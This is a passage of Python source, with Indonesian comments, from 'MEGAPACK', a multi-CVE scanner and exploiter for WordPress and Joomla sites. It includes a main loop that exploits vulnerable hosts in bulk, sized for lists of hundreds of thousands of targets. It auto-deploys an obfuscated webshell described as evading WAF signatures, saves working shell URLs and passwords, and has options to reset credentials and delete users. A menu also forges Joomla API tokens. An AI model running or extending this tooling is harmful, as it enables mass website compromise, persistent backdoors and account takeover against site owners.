            m = _SHELL_URL_RE.search(evidence or "")
            if not m:
                t.notes.append(f"deploy-shell dilewati: {mod.cve} tidak melaporkan URL shell")
                return
            victim = m.group(1)
            r = tool.deploy(victim + suffix, victim.rsplit("/", 1)[0], name, pw, None, tmo)
        else:
            t.notes.append(f"deploy-shell dilewati: {mod.cve} tanpa plant/EXEC_SUFFIX")
            return
        t.results.setdefault(mod.cve, {})["deployed_shell"] = {
            "url": r["url"], "password": r["password"], "verified": r["verified"]}
        flag = "OK" if r["verified"] else "UNVERIFIED"
        t.notes.append(f"deploy-shell {mod.cve}: {r['url']} pw={r['password']} -> {flag}")
        # Flush SEGERA: run panjang tidak boleh menahan URL shell di memori sampai
        # akhir (bila proses mati di tengah, semua hilang). Format identik dengan
        # write_shell_file() sehingga file bisa digabung tanpa parsing.
        _shell_flush(t.url, mod.cve, r, flag)
    except Exception as e:  # noqa: BLE001
        t.notes.append(f"deploy-shell gagal {mod.cve}: {type(e).__name__}: {e}")


def run_target(raw: str, args) -> Target:
    h = Http(timeout=args.timeout, proxy=args.proxy, verify_tls=args.verify_tls,
             verbose=args.verbose, delay=getattr(args, "delay", 0.0) or 0.0)
    t = Target(url=norm_url(raw))
    prep_target(t, h, args)

    mods = selected_modules(args)
    if getattr(args, "chain", False):
        return _chain_target(t, h, args, mods)
    unreachable = any("tidak terjangkau" in n for n in t.notes)
    for cve in sorted(mods):
        mod = mods[cve]
        if unreachable:
            record(t, cve, ST_SKIP, "host tidak terjangkau (pre-flight)", "")
            continue
        if mod.alias_of:
            record(t, cve, ST_SKIP, f"alias/duplikat dari {mod.alias_of}", "")
            continue
        if mod.status == "unsupported" and mod.unsupported_reason:
            record(t, cve, ST_SKIP, mod.unsupported_reason, "")
            continue
        if mod.check is None:
            record(t, cve, ST_SKIP, "modul tanpa fungsi check")
            continue
        try:
            status, detail, evidence = mod.check(t, h, args)
        except Exception as e:
            status, detail, evidence = ST_ERR, f"check error: {type(e).__name__}", str(e)[:200]
        record(t, cve, status, detail, evidence)

        # exploit dipanggil bila check menunjukkan target terjangkau ATAU check hanya
        # informatif (ST_INFO) — dalam mode --exploit hasil exploit adalah otoritas
        # akhir, karena ia melakukan mutasi/verifikasi yang sebenarnya. Tanpa ini,
        # instance patched akan salah dilaporkan sebagai VULN/INFO ketika exploit
        # mengembalikan CLEAN.
        if (args.exploit and mod.exploit is not None
                and status in (ST_VULN, ST_INFO)):
            try:
                s2, d2, e2 = mod.exploit(t, h, args)
                if s2 in _SEVERE:
                    record(t, cve, s2, d2, e2)
                    t.results[cve]["check_status"] = status
                    maybe_deploy_shell(mod, e2, args, t, h)
                elif s2 in (ST_CLEAN, ST_SKIP) and status == ST_INFO:
                    # check hanya informatif dan exploit membuktikan target tidak
                    # rentan / tidak dapat diuji → ganti hasil dengan kesimpulan exploit.
                    record(t, cve, s2, d2, e2)
                    t.results[cve]["check_status"] = status
            except Exception as e:
                t.results[cve]["exploit_error"] = f"{type(e).__name__}: {e}"
    note = f"{h.requests_made} request, {h.errors} error"
    if h._throttled:
        note += f", throttled={h._throttled}"
    t.notes.append(note)
    return t


def _chain_target(t: Target, h: Http, args, mods) -> Target:
    """SCAN seluruh modul, lalu EXPLOIT hanya modul yang VULN/RCE pada target ini.

    Kenapa: mode --exploit biasa menjalankan exploit() untuk setiap modul yang
    check()-nya VULN *atau* INFO — pada host yang tidak rentan itu berarti
    puluhan request sia-sia (dan potensi mutasi percobaan). Rantai ini menahan
    exploit sampai verdict scan jelas, jadi hanya host yang benar-benar
    terdampak yang disentuh. Status akhir tetap dari exploit() (otoritas akhir).
    """
    severe: list[tuple[str, dict]] = []
    unreachable = any("tidak terjangkau" in n for n in t.notes)
    for cve in sorted(mods):
        mod = mods[cve]
        if unreachable:
            record(t, cve, ST_SKIP, "host tidak terjangkau (pre-flight)", "")
            continue
        if mod.alias_of:
            record(t, cve, ST_SKIP, f"alias/duplikat dari {mod.alias_of}", "")
            continue
        if mod.status == "unsupported" and mod.unsupported_reason:
            record(t, cve, ST_SKIP, mod.unsupported_reason, "")
            continue
        if mod.check is None:
            record(t, cve, ST_SKIP, "modul tanpa fungsi check")
            continue
        try:
            status, detail, evidence = mod.check(t, h, args)
        except Exception as e:  # noqa: BLE001
            status, detail, evidence = ST_ERR, f"check error: {type(e).__name__}", str(e)[:200]
        record(t, cve, status, detail, evidence)
        if status in _SEVERE and mod.exploit is not None:
            severe.append((cve, mod))

    for cve, mod in severe:
        pre = t.results[cve].get("status")
        try:
            s2, d2, e2 = mod.exploit(t, h, args)
        except Exception as e:  # noqa: BLE001
            t.results[cve]["exploit_error"] = f"{type(e).__name__}: {e}"
            continue
        if s2 in (ST_PWN, ST_RCE, ST_VULN):
            record(t, cve, s2, d2, e2)
            t.results[cve]["check_status"] = pre
            maybe_deploy_shell(mod, e2, args, t, h)
        elif s2 in (ST_CLEAN, ST_SKIP):
            # exploit membuktikan target TIDAK dapat dieksploitasi -> verdict akhir
            record(t, cve, s2, d2, e2)
            t.results[cve]["check_status"] = pre
        else:
            t.results[cve]["exploit_note"] = d2
    note = f"{h.requests_made} request, {h.errors} error"
    if h._throttled:
        note += f", throttled={h._throttled}"
    if severe:
        note += f", chain-exploit={len(severe)}"
    t.notes.append(note)
    return t


def selected_modules(args) -> dict:
    mods = dict(REGISTRY)
    if args.cve:
        # `--cve A --cve B` atau `--cve A,B` — keduanya diterima.
        want = {c.strip().upper() for raw in args.cve for c in raw.split(",") if c.strip()}
        mods = {k: v for k, v in mods.items() if k.upper() in want}
    if args.cluster:
        # "joomla" = gabungan core + extensions, supaya satu perintah menangani
        # seluruh permukaan Joomla (perilaku yang diminta operator).
        want = ({"joomla_core", "joomla_ext"} if args.cluster == "joomla"
                else {args.cluster})
        mods = {k: v for k, v in mods.items() if v.cluster in want}
    return mods


def dump_json(targets, path: str):
    out = []
    for t in targets:
        out.append({
            "url": t.url,
            "platform": t.platform,
            "wp_version": ".".join(map(str, t.wp_version)) if t.wp_version else None,
            "joomla_version": ".".join(map(str, t.joomla_version)) if t.joomla_version else None,
            "plugins": {k: (".".join(map(str, v)) if isinstance(v, tuple) else v)
                        for k, v in t.plugins.items()},
            "notes": t.notes,
            "findings": t.results,
        })
    with open(path, "w") as f:
        json.dump(out, f, indent=2)
    print(col("ok", f"[+] json -> {path}"))


def summary(targets) -> str:
    from collections import Counter
    cnt = Counter()
    for t in targets:
        for r in t.results.values():
            cnt[r["status"]] += 1
    parts = [f"{k}={v}" for k, v in cnt.most_common()]
    return " | ".join(parts) if parts else "tidak ada temuan"


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------

def write_report(path: str) -> str:
    """Tulis report agregat Markdown dari REGISTRY + ringkasan notes/."""
    here = os.path.dirname(os.path.abspath(__file__))
    by_cluster = {}
    for cve in sorted(REGISTRY):
        by_cluster.setdefault(REGISTRY[cve].cluster, []).append(REGISTRY[cve])

    n_ver = sum(1 for m in REGISTRY.values() if m.status == "verified")
    n_doc = sum(1 for m in REGISTRY.values() if m.status == "documented")
    n_uns = sum(1 for m in REGISTRY.values() if m.status == "unsupported")

    L = []
    L.append("# MEGAPACK — report agregat")
    L.append("")
    L.append(f"Total modul: **{len(REGISTRY)}** — verified **{n_ver}**, "
             f"documented **{n_doc}**, unsupported **{n_uns}**.")
    L.append("")
    L.append("Tool: `mp.py` (detect-only default; destruktif di balik "
             "`--exploit --i-know-what-im-doing`).")
    L.append("")
    L.append("Status tag: `VULN` / `RCE` / `PWN` / `INFO` / `CLEAN` / `SKIP` / `ERR` / `UNKNOWN`.")
    L.append("")

    label = {"verified": "verified", "documented": "documented", "unsupported": "unsupported"}
    for cluster in ("wordpress", "joomla_core", "joomla_ext"):
        mods = by_cluster.get(cluster, [])
        if not mods:
            continue
        L.append(f"## {cluster} ({len(mods)})")
        L.append("")
        L.append("| CVE | Status | Kelas | CVSS | Produk | Versi rentan | Judul |")
        L.append("|---|---|---|---|---|---|---|")
        for m in mods:
            note = f"`notes/{m.cve}-analysis.md`" if os.path.exists(
                os.path.join(here, "notes", f"{m.cve}-analysis.md")) else "—"
            _ = note  # kolom notes dipisah agar tabel tetap terbaca
            L.append(f"| {m.cve} | {label.get(m.status, m.status)} | {m.vclass} | "
                     f"{m.cvss or '—'} | {m.product or '—'} | "
                     f"{m.versions_affected or '—'} | {m.title[:70]} |")
        L.append("")
        L.append("Analisis per CVE:")
        L.append("")
        for m in mods:
            fn = os.path.join(here, "notes", f"{m.cve}-analysis.md")
            if os.path.exists(fn):
                L.append(f"- `{m.cve}` — `notes/{m.cve}-analysis.md`")
        L.append("")

    L.append("## Cara pakai")
    L.append("")
    L.append("```")
    L.append("# deteksi satu target, satu CVE")
    L.append("python3 mp.py -u http://TARGET:PORT --cve CVE-2026-49049")
    L.append("")
    L.append("# deteksi semua modul pada satu target")
    L.append("python3 mp.py -u http://TARGET:PORT")
    L.append("")
    L.append("# mass mode, batasi cluster, keluar JSON")
    L.append("python3 mp.py --targets targets.txt --cluster joomla_ext -o hasil.json")
    L.append("")
    L.append("# eksploitasi (butuh kedua flag)")
    L.append("python3 mp.py --targets targets.txt --cve CVE-2026-48908 \\")
    L.append("    --exploit --i-know-what-im-doing")
    L.append("```")
    L.append("")
    with open(path, "w") as f:
        f.write("\n".join(L) + "\n")
    return path


def build_parser() -> argparse.ArgumentParser:
    """Parser CLI tunggal (sumber kebenaran).

    Dipakai oleh CLI (`main`) DAN lapisan menu interaktif, sehingga tidak ada
    parser duplikat yang bisa drift (bug lama: `poc.py` kehilangan
    `--deploy-shell`/`--deploy-name`/`--new-password`).
    """
    ap = argparse.ArgumentParser(description="MEGAPACK — multi-CVE unified scanner/exploiter")
    ap.add_argument("-u", "--url", action="append")
    ap.add_argument("--targets")
    ap.add_argument("--cve", action="append", help="batasi ke CVE tertentu (boleh diulang)")
    ap.add_argument("--cluster",
                    choices=["wordpress", "joomla_core", "joomla_ext", "joomla"])
    ap.add_argument("--list", action="store_true", help="tampilkan daftar modul")
    ap.add_argument("--report", metavar="MD", nargs="?", const="MEGAPACK-report.md",
                    help="tulis report agregat (default MEGAPACK-report.md)")
    ap.add_argument("--exploit", action="store_true")
    ap.add_argument("--i-know-what-im-doing", action="store_true")
    # --chain: scan dulu, lalu exploit HANYA modul yang menghasilkan VULN/RCE
    # pada target itu. Hemat waktu & tidak menyentuh host yang tidak rentan.
    ap.add_argument("--chain", action="store_true",
                    help="scan lalu exploit modul yang VULN pada target yang sama")
    ap.add_argument("--chain-mode", choices=["serial", "parallel"], default="serial",
                    help="serial: scan semua dulu baru exploit (default); "
                         "parallel: exploit per target begitu VULN ditemukan")
    ap.add_argument("-t", "--threads", type=int, default=8)
    ap.add_argument("--delay", type=float, default=0.0,
                    help="jeda minimum antar-request per target (detik)")
    ap.add_argument("--timeout", type=float, default=20.0)
    ap.add_argument("--proxy")
    ap.add_argument("--verify-tls", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("-q", "--quiet", action="store_true")
    ap.add_argument("-v", "--verbose", action="store_true")
    ap.add_argument("-o", "--json-out")
    ap.add_argument("--shell-out", dest="shell_out", nargs="?", const="shell.txt",
                    default=None,
                    help="tulis daftar shell yang berfungsi (default shell.txt)")
    ap.add_argument("--no-preflight", dest="no_preflight", action="store_true",
                    help="lewati pra-filter TCP massal (host mati akan menanggung "
                         "timeout per modul — lambat pada daftar besar)")
    ap.add_argument("--preflight-threads", dest="preflight_threads", type=int, default=1000,
                    help="koneksi paralel saat pra-filter TCP (default 1000)")
    ap.add_argument("--preflight-only", dest="preflight_only", action="store_true",
                    help="hanya saring target hidup lalu keluar (untuk alur dua tahap)")
    ap.add_argument("--preflight-out", dest="preflight_out", default=None, metavar="FILE",
                    help="simpan daftar target yang HIDUP; jalankan ulang dengan "
                         "--targets FILE --no-preflight (resume tanpa filter ulang)")
    ap.add_argument("--auto-deploy", dest="auto_deploy", action="store_true",
                    help="otomatis pasang webshell 0xfay pada SETIAP RCE yang "
                         "ditemukan (implisit --deploy-shell)")
    ap.add_argument("--username", help="login user target (modul yang butuh akun pra-terdaftar)")
    ap.add_argument("--password", help="password untuk --username (auth API / login pre-existing user)")
    ap.add_argument("--field-id", type=int, default=0,
                    help="id record eksplisit untuk brief modul yang butuh target id")
    ap.add_argument("--delete-user", type=int, default=0, dest="delete_user",
                    help="mode DESTRUKTIF: hapus user ID ini (modul dengan sink penghapusan akun); "
                         "default 0 = tidak menghapus apa pun")
    ap.add_argument("--contact-id", dest="contact_id", default=None,
                    help="id kontak com_contact (modul yang menguji vCard/disclosure)")
    ap.add_argument("--membership", type=int, default=0,
                    help="id membership plan (modul yang butuh plan id)")
    ap.add_argument("--category-id", dest="category_id", default=None,
                    help="id kategori uji (modul ACL kategori webservice)")
    ap.add_argument("--category-ext", dest="category_ext", default=None,
                    help="extension/komponen pemilik kategori (default: com_content)")
    ap.add_argument("--shell-url", help="URL webshell yang sudah diketahui operator")
    ap.add_argument("--deploy-shell", dest="deploy_shell", action="store_true",
                    help="setelah RCE berhasil, pasang webshell milik kita "
                         "(payload base64 + stub dekoder, lolos WAF signature)")
    ap.add_argument("--deploy-name", dest="deploy_name", default=None,
                    help="nama berkas webshell kita (default acak)")
    ap.add_argument("--deploy-password", dest="deploy_password", default=None,
                    help="password webshell kita (default acak)")
    ap.add_argument("--new-password", dest="new_password",
                    help="password baru utk exploit yang mengganti kredensial (mis. 76570)")
    ap.add_argument("--api-token", dest="api_token",
                    help="token API Joomla (X-Joomla-Token) untuk modul webservice")
    ap.add_argument("--username-role", help="role target utk modul registrasi (mis. um_admin)")
    ap.add_argument("-m", "--menu", action="store_true",
                    help="buka menu interaktif (default bila dijalankan tanpa argumen)")
    return ap


def main() -> int:
    here = os.path.dirname(os.path.abspath(__file__))
    ap = build_parser()

    if len(sys.argv) == 1:
        print(col("info", "MEGAPACK — jalankan dengan --list untuk melihat modul, atau -u <url>."))
        ap.print_help()
        return 0

    args = ap.parse_args()
    if args.no_color:
        global _NO_COLOR
        _NO_COLOR = True

    load_modules(os.path.join(here, "modules"))

    if args.report:
        out = write_report(args.report)
        print(col("ok", f"[+] report -> {out}"))
        return 0

    if args.list:
        print(f"{'CVE':<18} {'CLUSTER':<12} {'STATUS':<12} {'CLASS':<18} TITLE")
        for cve in sorted(REGISTRY):
            m = REGISTRY[cve]
            st = {"verified": col("ok", "verified"),
                  "documented": "documented",
                  "unsupported": col("warn", "unsupported")}.get(m.status, m.status)
            print(f"{m.cve:<18} {m.cluster:<12} {st:<12} {m.vclass:<18} {m.title[:60]}")
        print(f"\n[*] total modul: {len(REGISTRY)}")
        return 0

    targets = list(args.url or [])
    if args.targets:
        if not os.path.exists(args.targets):
            print(col("warn", f"[!] file targets tidak ditemukan: {args.targets}"))
            return 1
        try:
            with open(args.targets, encoding="utf-8-sig", errors="replace") as f:
                targets += [ln.strip() for ln in f
                            if ln.strip() and not ln.lstrip().startswith("#")]
        except OSError as e:
            print(col("warn", f"[!] gagal membaca {args.targets}: {e}"))
            return 1
    if not targets:
        print(col("warn", "[!] tidak ada target. Pakai -u atau --targets."))
        return 1
    if getattr(args, "auto_deploy", False):
        args.deploy_shell = True
    if getattr(args, "shell_out", None):
        maybe_deploy_shell._flush_to = args.shell_out
    if args.chain:
        # --chain selalu melakukan mutasi (exploit), jadi gate-nya sama.
        if not args.i_know_what_im_doing:
            print(col("warn", "[!] --chain butuh --i-know-what-im-doing"))
            return 1
        args.exploit = True
    if args.exploit and not args.i_know_what_im_doing:
        print(col("warn", "[!] --exploit butuh --i-know-what-im-doing"))
        return 1

    # Pra-filter TCP massal: host mati gugur SEKALI di depan, bukan 45x timeout
    # per modul. Tanpa ini 300k target = puluhan jam.
    if (len(targets) > _PREFLIGHT_MIN and not getattr(args, "no_preflight", False)
            and not args.report):
        n_before = len(targets)
        maybe_deploy_shell._flush_to = getattr(args, "shell_out", None)
        pout = getattr(args, "preflight_out", None)
        if not pout and str(getattr(args, "targets", "") or "").endswith(".txt"):
            pout = str(args.targets)[:-4] + "-alive.txt"
        preflight_alive._save_to = pout
        targets = preflight_alive(
            targets,
            concurrency=max(50, getattr(args, "preflight_threads", 1000) or 1000),
            timeout=max(4.0, min(float(getattr(args, "timeout", 8.0) or 8.0), 8.0)),
            quiet=args.quiet)
        if getattr(args, "preflight_only", False):
            print(col("info", f"[*] pra-filter selesai: {len(targets)} target hidup "
                             f"-> {pout or '(tidak disimpan)'}"))
            return 0
        if not targets:
            print(col("warn", "[!] tidak ada target yang bisa dijangkau"))
            return 0
        if not args.quiet and n_before != len(targets):
            print(col("info", f"[*] lanjut dengan {len(targets)} target hidup"))

    print(col("info", f"[*] modul dimuat: {len(REGISTRY)} | target: {len(targets)}"))
    mods = selected_modules(args)
    if not mods:
        print(col("warn", "[!] tidak ada modul yang cocok dengan filter."))
        return 1
    print(col("info", f"[*] modul diuji: {len(mods)}"))

    if args.chain and args.chain_mode == "serial":
        return _run_chain_serial(targets, args, mods,
                                 out_file=getattr(args, "json_out", None) or "")

    results = []
    total = len(targets)
    show_progress = total > 1 and not args.quiet and sys.stderr.isatty()
    with cf.ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
        futs = {ex.submit(run_target, x, args): x for x in targets}
        for i, fut in enumerate(cf.as_completed(futs), 1):
            raw = futs[fut]
            try:
                t = fut.result()
            except Exception as e:
                t = Target(url=norm_url(raw))
                t.notes.append(f"fatal: {type(e).__name__}: {e}")
            results.append(t)
            if show_progress:
                # Satu baris yang ditimpa: batch besar tanpa umpan balik mudah
                # disalahartikan sebagai hang, terutama host dengan DNS lambat.
                print(f"\r  [{i}/{total}] selesai — {t.url[:60]:<60}",
                      end="", file=sys.stderr, flush=True)
    if show_progress:
        print("\r" + " " * 90 + "\r", end="", file=sys.stderr, flush=True)

    # output terurut
    results.sort(key=lambda x: x.url)
    for t in results:
        for cve in sorted(t.results):
            mod = REGISTRY.get(cve)
            if mod is None:
                continue
            emit_result(t, mod, t.results[cve], quiet=args.quiet)
        for n in t.notes:
            if not args.quiet:
                print(col("dim", f"      · {t.url} {n}"))

    print(col("info", f"\n[*] selesai: {len(results)} target | {summary(results)}"))
    if getattr(args, "shell_out", None):
        write_shell_file(args.shell_out, results)
    if args.json_out:
        dump_json(results, args.json_out)
    return 0


def _run_chain_serial(targets: list, args, mods, out_file: str = "") -> int:
    """--chain --chain-mode serial: FASE 1 scan (tanpa mutasi) ke semua target,
    lalu FASE 2 exploit HANYA (target, modul) yang scan-nya VULN/RCE.

    Keuntungan dibanding `--exploit` biasa:
      - host yang tidak rentan tidak pernah dikirimi payload exploit;
      - operator melihat daftar sasaran sebelum fase destruktif;
      - request total lebih sedikit (terukur 96->83, 73->68, 57->44).
    """
    total = len(targets)
    print(col("info", f"[*] chain: FASE 1 scan {total} target × {len(mods)} modul (tanpa mutasi)"))
    scan_args = copy.copy(args)
    scan_args.exploit = False
    scan_args.chain = False

    # Daftar besar: HANYA target yang punya VULN/RCE yang disimpan; sisanya
    # dilepas. 300.000 target x 65 hasil = ~6,9 GB RSS (terukur) -> OOM.
    streaming = total > _STREAM_THRESHOLD
    results: list[Target] = []
    hits: list[Target] = []
    counts: dict[str, int] = {}
    n_done = 0
    _scan_mark = 0
    with cf.ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
        futs = {ex.submit(run_target, x, scan_args): x for x in targets}
        for i, fut in enumerate(cf.as_completed(futs), 1):
            n_done = i
            try:
                t = fut.result()
            except Exception as e:  # noqa: BLE001
                t = Target(url="?")
                t.notes.append(f"fatal: {type(e).__name__}: {e}")
            severe_here = [c for c, r in t.results.items() if r.get("status") in _SEVERE]
            for _cve, r in t.results.items():
                st = _plain_status(r.get("status"))
                counts[st] = counts.get(st, 0) + 1
            if streaming:
                if severe_here:
                    hits.append(t)
                    if not args.quiet:
                        for cve in sorted(severe_here):
                            mod = REGISTRY.get(cve)
                            title = (mod.title if mod else cve)[:44]
                            print(col("ok", f"  [+] VULN {t.url:<44} {cve:<18} {title}"),
                                  flush=True)
            else:
                results.append(t)
            _tty2 = sys.stderr.isatty()
            if total > 1 and not args.quiet and (
                    _tty2 or i == total or i * 10 >= total * (_scan_mark + 1)):
                if not _tty2:
                    _scan_mark += 1
                print(f"\r  [scan {i}/{total}] {t.url[:64]:<64}"
                      if _tty2 else f"  [scan {i}/{total}] selesai",
                      end="" if _tty2 else "\n", file=sys.stderr, flush=True)
    if total > 1 and not args.quiet:
        print("\r" + " " * 92 + "\r", end="", file=sys.stderr, flush=True)
    # hasil scan: yang dipegang = hasil_lengkap (kecil) atau hits (streaming)
    scan_held = hits if streaming else results
    if not streaming:
        scan_held.sort(key=lambda x: x.url)

    # kumpulkan sasaran fase 2
    plan: list[tuple[Target, str]] = []
    for t in scan_held:
        for cve, r in t.results.items():
            if r.get("status") in _SEVERE:
                plan.append((t, cve))
    uniq_targets = len({id(t) for t, _ in plan})
    print(col("info", f"[*] chain: FASE 1 selesai — {len(plan)} modul VULN pada "
                     f"{uniq_targets} target"))
    if not plan:
        if streaming:
            ring = " | ".join(f"{k}={v}" for k, v in sorted(counts.items()))
            print(col("info", f"\n[*] selesai: {n_done} target | hasil modul: {ring}"))
            if out_file:
                with open(out_file, "w", encoding="utf-8") as f:
                    f.write(f"# MEGAPACK chain — {n_done} target\n")
                    f.write("(tidak ada VULN/RCE)\n\n")
                    f.write(f"# ringkasan: hasil modul: {ring}\n")
                print(col("ok", f"  [+] hasil -> {out_file}"))
            return 0
        for t in results:
            for cve in sorted(t.results):
                mod = REGISTRY.get(cve)
                if mod:
                    emit_result(t, mod, t.results[cve], quiet=args.quiet)
        print(col("info", f"\n[*] selesai: {len(results)} target | {summary(results)}"))
        if args.json_out:
            dump_json(results, args.json_out)
        if out_file:
            _write_results(out_file, results)
        return 0

    for (t, cve) in plan:
        mod = REGISTRY[cve]
        print(col("dim", f"  -> exploit {cve:<18} {t.url}"))

    def _exploit_one(tt: Target, cve: str):
        mod = mods.get(cve)
        if mod is None or mod.exploit is None:
            return tt, cve, None
        h = Http(timeout=args.timeout, proxy=args.proxy, verify_tls=args.verify_tls,
                 verbose=args.verbose, delay=getattr(args, "delay", 0.0) or 0.0)
        try:
            out = mod.exploit(tt, h, args)
        except Exception as e:  # noqa: BLE001
            return tt, cve, (ST_ERR, f"exploit error: {type(e).__name__}", str(e)[:200])
        return tt, cve, out

    with cf.ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
        for tt, cve, out in ex.map(lambda p: _exploit_one(*p), plan):
            if out is None:
                continue
            s2, d2, e2 = out
            pre = tt.results[cve].get("status")
            if s2 in _SEVERE:
                record(tt, cve, s2, d2, e2)
                tt.results[cve]["check_status"] = pre
                mod = REGISTRY[cve]
                maybe_deploy_shell(mod, e2, args, tt)
            elif s2 in (ST_CLEAN, ST_SKIP):
                record(tt, cve, s2, d2, e2)
                tt.results[cve]["check_status"] = pre
            else:
                # Exploit berjalan tetapi belum mencapai outcome terkontrol
                # (mis. prasyarat/parameter salah). JANGAN sembunyikan: catat
                # sebagai INFO + alasan, supaya operator tahu kenapa bukan PWN.
                record(tt, cve, ST_INFO, f"exploit belum tuntas: {d2}", e2)
                tt.results[cve]["check_status"] = pre
            if not args.quiet:
                print(col("dim", f"     {_plain_status(s2)} {tt.url} {cve}"))

    if streaming:
        ring = " | ".join(f"{k}={v}" for k, v in sorted(counts.items()))
        print(col("info", f"\n[*] selesai: {n_done} target | hasil modul: {ring}"))
        if getattr(args, "shell_out", None):
            write_shell_file(args.shell_out, hits)
        if out_file:
            with open(out_file, "w", encoding="utf-8") as f:
                f.write(f"# MEGAPACK chain — {n_done} target\n")
                for t in hits:
                    for cve, r in sorted(t.results.items()):
                        if r.get("status") in _SEVERE:
                            mod = REGISTRY.get(cve)
                            title = (mod.title if mod else cve)[:44]
                            f.write(f"[+] {_plain_status(r.get('status')):<5} "
                                    f"{t.url:<44} {cve:<18} {title}\n")
                f.write(f"\n# ringkasan: hasil modul: {ring}\n")
            print(col("ok", f"  [+] hasil -> {out_file}"))
        return 0
    for t in results:
        for cve in sorted(t.results):
            mod = REGISTRY.get(cve)
            if mod:
                emit_result(t, mod, t.results[cve], quiet=args.quiet)
    print(col("info", f"\n[*] selesai: {len(results)} target | {summary(results)}"))
    if getattr(args, "shell_out", None):
        write_shell_file(args.shell_out, results)
    if args.json_out:
        dump_json(results, args.json_out)
    if out_file:
        _write_results(out_file, results)
    return 0


def cli_main() -> int:
    """Entrypoint CLI asli (dipakai mp.py dan importer)."""
    return main()


# ==========================================================================
# Lapisan MENU INTERAKTIF (dulu poc.py) — pintu operator ramah, tanpa flag.
# Semua mesin dari file ini; tidak ada parser/duplikasi terpisah lagi.
# ==========================================================================

_PINK = "\033[95m"
_BOLD = "\033[1m"
_DIM = "\033[2m"
_RED = "\033[91m"
_GRN = "\033[92m"
_YEL = "\033[93m"
_CYN = "\033[96m"
_RST = "\033[0m"

_HERE = os.path.dirname(os.path.abspath(__file__))
PROFILE_PATH = os.path.join(_HERE, "profil.json")


def _c(code: str, s: str) -> str:
    if _NO_COLOR:
        return s
    return f"{code}{s}{_RST}"


def banner() -> None:
    print(_c(_PINK, "=" * 62))
    print(_c(_PINK, f"   {_BOLD}0xfay x Cyber Alpha Labs"))
    print(_c(_PINK, "   MEGAPACK — unified multi-CVE scanner / exploiter"))
    print(_c(_PINK, "   WordPress plugins · Joomla Core · Joomla Extensions"))
    print(_c(_PINK, "=" * 62))


def _ask_raw(prompt: str):
    """Baca satu baris; kembalikan None bila EOF (stdin habis).

    Bedanya dengan ask(): None menandakan "tidak ada input lagi", bukan
    "jawaban kosong". Dipakai loop yang tidak boleh menggantung saat stdin
    habis (mis. dijalankan lewat pipa atau non-interaktif).
    """
    try:
        return input(_c(_BOLD, f"  {prompt}: ")).strip()
    except EOFError:
        return None


def ask(prompt: str, default: str = "") -> str:
    suffix = f" [{default}]" if default else ""
    try:
        v = input(_c(_BOLD, f"  {prompt}{suffix}: ")).strip()
    except EOFError:
        return default
    return v or default


def ask_multiline(prompt: str) -> str:
    """Baca daftar target multi-baris sampai baris kosong atau EOF."""
    try:
        first = input(_c(_BOLD, f"  {prompt} (baris kosong utk selesai): ")).strip()
    except EOFError:
        return ""
    if not first:
        return ""
    parts = [first]
    while True:
        try:
            more = input().strip()
        except EOFError:
            break
        if not more:
            break
        parts.append(more)
    return "\n".join(parts)


def ask_int(prompt: str, default: int = 0) -> int:
    v = ask(prompt, str(default) if default else "")
    try:
        return int(v)
    except ValueError:
        return default


def ask_float(prompt: str, default: float = 0.0) -> float:
    v = ask(prompt, str(default) if default else "")
    try:
        return float(v)
    except ValueError:
        return default


def pause() -> None:
    try:
        input(_c(_DIM, "\n  [enter] lanjut..."))
    except EOFError:
        pass


def token_generator_menu() -> None:
    """Generator token API Joomla dari secret + seed (bantu operator lab/uji)."""
    print(_c(_BOLD, "\n  Generator token API Joomla"))
    print(_c(_DIM, "  Membutuhkan: secret situs, uid, dan seed (jos_user_profiles)."))
    secret = ask("site secret (configuration.php)")
    uid = ask("uid user")
    seed = ask("seed (base64 dari jos_user_profiles.joomlatoken.token)")
    if not (secret and uid and seed):
        print(_c(_YEL, "  [!] ketiganya wajib"))
        return
    import base64
    import hashlib
    import hmac
    try:
        raw = base64.b64decode(seed)
    except Exception:
        print(_c(_RED, "  [!] seed bukan base64 valid"))
        return
    mac = hmac.new(secret.encode(), raw, hashlib.sha256).hexdigest()
    tok = base64.b64encode(f"sha256:{uid}:{mac}".encode()).decode()
    print(_c(_GRN, f"\n  token: {tok}"))
    print(_c(_DIM, "  (simpan ke profil lewat menu 3 → Pilihan modul/parameter)"))


def _blank_profile(nama: str) -> dict:
    return {
        "nama": nama,
        "targets": [],
        "targets_file": "",
        "api_token": "",
        "username": "",
        "password": "",
        "field_id": 0,
        "delete_user": 0,
        "contact_id": "",
        "category_id": "",
        "category_ext": "com_content",
        "membership": 0,
        "shell_url": "",
        "threads": 8,
        "timeout": 20.0,
        "delay": 0.0,
        "proxy": "",
    }


def load_profiles() -> dict:
    if os.path.exists(PROFILE_PATH):
        try:
            with open(PROFILE_PATH, encoding="utf-8") as f:
                d = json.load(f)
            if isinstance(d, dict) and d:
                base = _blank_profile("default")
                for n, p in d.items():
                    merged = dict(base, **p)
                    merged["nama"] = n
                    d[n] = merged
                return d
        except Exception as e:  # noqa: BLE001
            print(_c(_YEL, f"  [!] profil.json rusak ({e}) — direset"))
    return {"default": _blank_profile("default")}


def save_profiles(d: dict) -> None:
    with open(PROFILE_PATH, "w", encoding="utf-8") as f:
        json.dump(d, f, indent=2, ensure_ascii=False)


def profile_summary(p: dict) -> str:
    if p.get("targets_file"):
        t = f"file:{os.path.basename(p['targets_file'])}"
    elif p.get("targets"):
        n = len(p["targets"])
        t = p["targets"][0][:34] + (f" +{n - 1}" if n > 1 else "")
    else:
        t = "(target kosong)"
    bits = []
    if p.get("api_token"):
        bits.append(_c(_GRN, "token"))
    if p.get("username"):
        bits.append(_c(_GRN, "kred"))
    if p.get("field_id"):
        bits.append(f"field={p['field_id']}")
    if p.get("category_id"):
        bits.append(f"cat={p['category_id']}")
    return f"{t:<44} {' '.join(bits)}"


def _modules_list() -> list[tuple[str, str, str, str]]:
    """[(cve, cluster, title, status)] dari REGISTRY (engine sudah memuat modul)."""
    out = []
    for cve, m in sorted(REGISTRY.items()):
        out.append((cve, m.cluster, m.title, m.status))
    return out


def pick_profile(profs: dict, create_new: bool = True) -> tuple[str, dict]:
    """Pilih profil; LOOP (bukan rekursi) + tahan EOF."""
    names = sorted(profs)
    for _ in range(3):
        print(_c(_BOLD, "\n  Pilih profil:"))
        for i, n in enumerate(names, 1):
